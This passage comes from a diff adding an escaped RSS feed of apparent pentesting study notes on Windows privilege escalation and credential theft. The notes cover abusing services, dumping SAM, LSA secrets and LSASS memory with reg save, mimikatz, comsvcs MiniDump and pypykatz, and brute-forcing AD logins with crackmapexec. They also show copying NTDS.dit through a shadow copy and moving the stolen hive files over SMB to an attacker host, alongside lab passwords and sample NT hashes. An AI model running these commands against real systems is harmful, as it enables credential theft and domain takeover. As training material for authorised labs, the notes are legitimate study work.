+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">-&lt;/span> &lt;span class="n">SeRestore&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## SeBackup&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Allows&lt;/span> &lt;span class="n">us&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="nb">copy &lt;/span>&lt;span class="n">a&lt;/span> &lt;span class="n">file&lt;/span> &lt;span class="n">from&lt;/span> &lt;span class="n">a&lt;/span> &lt;span class="n">folder&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">even&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">there&lt;/span> &lt;span class="n">are&lt;/span> &lt;span class="n">access&lt;/span> &lt;span class="n">controls&lt;/span> &lt;span class="k">in&lt;/span> &lt;span class="n">place&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ACE&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ACL&lt;/span>&lt;span class="p">).&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="references">References&lt;/h2>
+&lt;p>## We can use the following &lt;code>PoC&lt;/code> to exploit &lt;code>SeBackupPrivilege&lt;/code>
+(1) &lt;a href="https://github.com/giuliano108/SeBackupPrivilege">PoC&lt;/a>&lt;/p></description></item><item><title>Abusing Windows Services</title><link>https://hack.com.cy/notes/privilege-escalation/windows/services/services/</link><pubDate>Fri, 08 Aug 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/notes/privilege-escalation/windows/services/services/</guid><description>&lt;h1 id="services---unquoted-service-path---hijacking">Services - Unquoted Service Path - Hijacking&lt;/h1>
+&lt;h2 id="searching-for-running--stopped-services">Searching for Running &amp;amp; Stopped Services&lt;/h2>
+&lt;p>When working with Windows services, identifying running and stopped services is crucial for discovering misconfigurations that could lead to privilege escalation.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service may result in &amp;#34;permission denied&amp;#34;.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># See All Running Services&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">win32_service&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Select &lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">State&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">PathName&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">State&lt;/span> &lt;span class="o">-like&lt;/span> &lt;span class="s1">&amp;#39;Running&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Discard Services that start from &amp;#34;C:/Windows&amp;#34; to filter out system services&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">win32_service&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Select &lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">State&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">PathName&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">State&lt;/span> &lt;span class="o">-like&lt;/span> &lt;span class="s1">&amp;#39;Running&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="n">findstr&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="s2">&amp;#34;C:\Windows&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get Running Services using SC command&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">sc &lt;/span>&lt;span class="n">query&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="n">findstr&lt;/span> &lt;span class="n">SERVICE_NAME&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get both STOPPED and RUNNING Services&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">win32_service&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Select &lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">State&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">PathName&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="searching-for-unquoted-service-paths">Searching for Unquoted Service Paths&lt;/h2>
+&lt;p>Unquoted service paths are a common misconfiguration where a service executable path contains spaces but lacks quotation marks. This allows an attacker to place a malicious executable in an earlier part of the path, leading to privilege escalation.&lt;/p></description></item><item><title>Windows Local Password Attacks</title><link>https://hack.com.cy/notes/privilege-escalation/windows/passwords/passwords/</link><pubDate>Fri, 08 Aug 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/notes/privilege-escalation/windows/passwords/passwords/</guid><description>&lt;h1 id="attacking-sam">Attacking SAM&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">## Using `reg.exe` to Copy Registry Hives (requires admin)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">## REMEMBER `RUN THE CMD AS ADMIN`
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg.exe save hklm\sam C:\sam.save
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg.exe save hklm\system C:\system.save
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg.exe save hklm\security C:\security.save
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Explanation&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- python3 /../smbserver.py -smb2support : Creates the Share
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- CompData : Give the Share a name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- /home/ltndotpirate/Documents/ : Where the share will be storitng data
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## On Kali (10.10.15.16)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltndotpirate/Documents/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## On Windows&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">move sam.save &lt;span class="se">\\&lt;/span>10.10.15.16&lt;span class="se">\C&lt;/span>ompData
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">move security.save &lt;span class="se">\\&lt;/span>10.10.15.16&lt;span class="se">\C&lt;/span>ompData
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">move system.save &lt;span class="se">\\&lt;/span>10.10.15.16&lt;span class="se">\C&lt;/span>ompData
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dumping-hashes---impacket-secretsdumppy">Dumping Hashes - Impacket secretsdump.py&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Using secretsdup.py&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="cracking-hashes-with-hashcat">Cracking Hashes with Hashcat&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Pupulate a .txt file with NT hashes (dumped from secretsdump)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat hashestocrack.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">64f12cddaa88057e06a81b54e73b949b
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">31d6cfe0d16ae931b73c59d7e0c089c0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">6f8c3f4d3869a10f3b4f0522f537fd33
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">184ecdda8cf1dd238d438c4aea4d560d
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">f7eb9c06fafaa23c4bcf22ba6781c1e2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Start cracking&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo hashcat -m &lt;span class="m">1000&lt;/span> hashestocrack.txt /usr/share/wordlists/rockyou.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="remote-dumping--lsa-secrets-considerations">Remote Dumping &amp;amp; LSA Secrets Considerations&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## With access to credenials with (local admin privileges) we might be able to extract credentials from a `running service`, `scheduled task` or `application` that uses `LSA secrets to store passwords`.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Dumping LSA secrets&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Using Crackmapexec | Netexec&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">crackmapexec smb 10.10.10.13 --local-auth -u dotpirate -p HTB_@cademy_stdnt! --lsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Dumping SAM remotely&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">crackmapexec smb 10.10.10.13 --local-auth -u dotpirate -p Passw0rd123 --sam
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dumping-local-hashes-with-mimikatz-on-windows-cmd">Dumping LOCAL-Hashes with Mimikatz (On Windows CMD)&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">## Steps
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>1&lt;span class="p">)&lt;/span> Extract `SYSTEM` and `SAM` regictry hives from local machine.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg save HKLM\sam C:\sam.save
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg save HKLM\system C:\system.save
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>2&lt;span class="p">)&lt;/span> Run mimikatz
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>3&lt;span class="p">)&lt;/span> Elevate priviliages in mimikatz
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">privilege::debug
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">token::elevate
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>4&lt;span class="p">)&lt;/span> Proceed to dump the local-hashes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lsadump::sam system.save sam.save
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>5&lt;span class="p">)&lt;/span> List LM &lt;span class="p">&amp;amp;&lt;/span> NTLM credentials
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sekurlsa::msv
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dumping-hashes-for-all-logged-on-users-to-the-current-workstation-ad-included">Dumping Hashes for all Logged-on Users to the Current Workstation (AD included)&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">.\mimikatz.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">privilege::debug
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sekurlsa::logonpasswords
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;hr>
+&lt;h1 id="attacking-lsass">Attacking LSASS&lt;/h1>
+&lt;h2 id="dumping-lsass-process-memory">Dumping LSASS Process Memory&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-mysql" data-lang="mysql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Task Manager Method
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">Open&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Task&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Manager&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Process&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">tab&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Find&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">right&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">click&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">on&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Local&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Security&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Authority&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Process&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Create&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">dump&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## A file called lsass.DMP is created and saved in the following path:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\l&lt;/span>oggedonusersdirectory&lt;span class="se">\A&lt;/span>ppData&lt;span class="se">\L&lt;/span>ocal&lt;span class="se">\T&lt;/span>emp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## NOTE: Its Always better to tranfer the files to our attacking machine for cracking&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="rundll32exe--comsvcsdll-method--pypykatz">Rundll32.exe &amp;amp;&amp;amp; Comsvcs.dll Method &amp;amp; Pypykatz&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">## Before issuing a command to create a dump file, we must determine what `process ID (PID) is assigned to lsass.exe`. This can be done from both CMD and POWERSHELL:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">## Finding LSASS PID in CMD (as admin)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tasklist /svc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">## Finding LSASS PID in POWERSHELL (as admin)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Get-Process lsass
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">### Creating lsass.dmp using powershell
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">## Explanation of the above command
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- rundll32 C:\windows\system32\comsvcs.dll : Running &amp;#39;rundll32&amp;#39; to call an exported function &amp;#39;comsvcs.dll&amp;#39; which calls &amp;#39;MiniDumpWrite&amp;#39; function to dump LSASS process memory
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- 672 : lsass.exe PID
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- C:\lsass.dump : Specifies directory where the dump is stored
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="pypykatz">Pypykatz&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Using `Pypykatz` to extract credentials after getting the lsass.dmp&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Once we have the lsass.dmp file on our Linux-machine we can proceed to extract the secrets from it.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo pypykatz lsa minidump /home/addict/lsass.dmp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Explanation&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- lsa : use &lt;span class="sb">`&lt;/span>lsa&lt;span class="sb">`&lt;/span> in the &lt;span class="nb">command&lt;/span> because LSASS is a subsystem of &lt;span class="sb">`&lt;/span>&lt;span class="nb">local&lt;/span> security authority&lt;span class="sb">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- minidump : we specify the data &lt;span class="nb">source&lt;/span> as a &lt;span class="sb">`&lt;/span>minidump&lt;span class="sb">`&lt;/span> file
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- /home/addict/lsass.dmp :  path to the dump file
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;hr>
+&lt;h1 id="attacking-ad--ntdsdit">Attacking AD &amp;amp; NTDS.dit&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## From MITRE&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NTDS file location: %SystemRoot%&lt;span class="se">\N&lt;/span>TDS&lt;span class="se">\N&lt;/span>tds.dit &lt;span class="o">(&lt;/span>in the domain cotroller&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Resource: https://attack.mitre.org/techniques/T1003/003/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dictionary-attacks-against-ad">Dictionary Attacks against AD&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Creating Custom list of Usernames&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Browse target site and find potential employeenames&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat usernames
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ben Williamson
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dotpirate Burgerstien
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Jim Stevenson
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Jill Johnson
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Jane Doe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Using username-anarchy (automation)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo git clone https://github.com/urbanadventurer/username-anarchy.git
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./username-anarchy -i usernames
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Using Crackmapexec &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="capturing-ntdsdit">Capturing NTDS.dit&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Connecting to DC with Evil-WinRM&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo evil-winrm -i 10.129.202.57 -u bwilliamson -p &lt;span class="s1">&amp;#39;P#55w0rd!&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Checking Local Group Policy&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\&amp;gt;&lt;/span> net localgroup
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Checking User Account Privileges inclidung Domain&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\&amp;gt;&lt;/span> net user bwilliamson
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Creating Shadow Copy of C: using `vssadmin`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\&amp;gt;&lt;/span> vssadmin CREATE SHADOW /For&lt;span class="o">=&lt;/span>C:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Copying NTDS.dir from the VSS&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\N&lt;/span>TDS&amp;gt; cmd.exe /c copy &lt;span class="se">\\&lt;/span>?&lt;span class="se">\G&lt;/span>LOBALROOT&lt;span class="se">\D&lt;/span>evice&lt;span class="se">\H&lt;/span>arddiskVolumeShadowCopy2&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\N&lt;/span>TDS&lt;span class="se">\N&lt;/span>TDS.dit c:&lt;span class="se">\N&lt;/span>TDS&lt;span class="se">\N&lt;/span>TDS.dit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## On Kali (10.10.15.30)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltndotpirate/Documents/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## On Windows&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\N&lt;/span>TDS&amp;gt; cmd.exe /c move C:&lt;span class="se">\N&lt;/span>TDS&lt;span class="se">\N&lt;/span>TDS.dit &lt;span class="se">\\&lt;/span>10.10.15.30&lt;span class="se">\C&lt;/span>ompData
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\&amp;gt;&lt;/span> reg.exe save hklm&lt;span class="se">\s&lt;/span>ystem C:&lt;span class="se">\s&lt;/span>ystem.save
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PS C:&lt;span class="se">\&amp;gt;&lt;/span> move system.save &lt;span class="se">\\&lt;/span>10.10.15.30&lt;span class="se">\C&lt;/span>ompData
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Extracting ntds using secretsdump.py&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ./NTDS.dit -system system.save -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
